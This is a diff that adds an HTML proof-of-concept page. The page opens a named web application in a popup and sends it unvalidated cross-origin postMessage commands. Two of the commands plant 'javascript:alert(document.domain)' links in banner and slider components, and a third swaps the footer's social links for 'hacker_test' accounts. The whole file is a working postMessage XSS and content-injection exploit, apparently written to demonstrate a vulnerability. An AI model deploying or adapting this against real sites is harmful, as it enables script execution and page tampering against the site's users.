@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+ <meta charset="utf-8" />
+<script>
+
+function sendMessage(){
+    child = window.open('https://apps.meraki.io','popup', 'height=3000px, width=5000px');
+    let msg = {
+  postMessageAction: "settings",
+  componentId: "CustomFullWidthBanner", 
+  settings: {
+  
+    ctaUrl: "javascript:alert(document.domain)",
+    // ...
+  }
+};
+    let msg2 = {
+  postMessageAction: "settings",
+  componentId: "ProductSliderCustom-top", 
+  settings: {
+
+    viewAllUrl: "javascript:alert(document.domain)",
+    // ...
+  }
+};
+    let msg3 = {
+  postMessageAction: "settings",
+  componentId: "FrameFooter", 
+  settings: {
+    "socials": {
+    "items": [
+        {
+            "label": "Twitter",
+            "icon": "twitter",
+            "isVisible": true,
+            "values": {
+                "accountLink": {
+                    "value": "https://twitter.com/hacker_test"
+                },
+                "uploadIcon": {
+                    "value": {
+                        "filename": "twitter",
+                        "url": "icon.url"
+                    }
+                }
+            }
+        },
+        {
+            "label": "Instagram",
+            "icon": "instagram",
+            "isVisible": true,
+            "values": {
+                "accountLink": {
+                    "value": "https://www.instagram.com/hacker_test"
+                },
+                "uploadIcon": {
+                    "value": {
+                        "filename": "instagram",
+                        "url": "icon.url"
+                    }
+                }
+            }
+        },
+        {
+            "label": "Facebook",
+            "icon": "facebook",
+            "isVisible": true,
+            "values": {
+                "accountLink": {
+                    "value": "https://www.facebook.com/hacker_test/"
+                },
+                "uploadIcon": {
+                    "value": {
+                        "filename": "facebook",
+                        "url": "icon.url"
+                    }
+                }
+            }
+        },
+        {
+            "label": "Youtube",
+            "icon": "youtube",
+            "isVisible": true,
+            "values": {
+                "accountLink": {
+                    "value": "https://www.youtube.com/user/hacker_test"
+                },
+                "uploadIcon": {
+                    "value": {
+                        "filename": "youtube",
+                        "url": "icon.url"
+                    }
+                }
+            }
+        }
+    ],
+    "prompts": {
+        "delete": {
+            "title": "uieditor.sfbComponent.footer.socialIcons.delete.title",
+            "description": "uieditor.sfbComponent.footer.socialIcons.delete.message",
+            "submitButtonLabel": "uieditor.sfbComponent.footer.socialIcons.delete.account",
+            "cancelButtonLabel": "uieditor.cancel.button"
+        }
+    },
+    "form": {
+        "accountLink": {
+            "title": "uieditor.sfbComponent.footer.socialIcons.accountLink.title",
+            "placeholder": "uieditor.sfbComponent.footer.socialIcons.accountLink.placeholder",
+            "defaultValue": "",
+            "type": "INPUT",
+            "required": false,
+            "validation": {
+                "pattern": {},
+                "message": "uieditor.sfbComponent.input.validation.message"
+            }
+        },
+        "uploadIcon": {
+            "title": "uieditor.sfbComponent.footer.socialIcons.uploadIcon.title",
+            "caption": "uieditor.editorProperties.globalStyles.logo.logoImage.caption",
+            "placeholder": "uieditor.sfbComponent.footer.socialIcons.uploadIcon.placeholder",
+            "buttonText": "uieditor.sfbComponent.footer.socialIcons.uploadIcon.buttonText",
+            "defaultValue": "",
+            "type": "IMAGE_UPLOADER",
+            "required": false
+        }
+    },
+    "contextMenuOptions": [
+        "SHOW_HIDE"
+    ]
+},
+    // ...
+  }
+};
+    setTimeout(function(){
+        child.postMessage(msg,'*');
+        child.postMessage(msg2,'*');
+	    child.postMessage(msg3,'*');
+      }, 3000);
+
+
+}
+</script>
+</head>
+
+<body>
+   
+    <form>
+        <fieldset>
+            <input type='button' id='btnSendMsg' value='Click Me' onclick='sendMessage();' />
+        </fieldset>
+    </form>
+
+</body>
+</html>
+
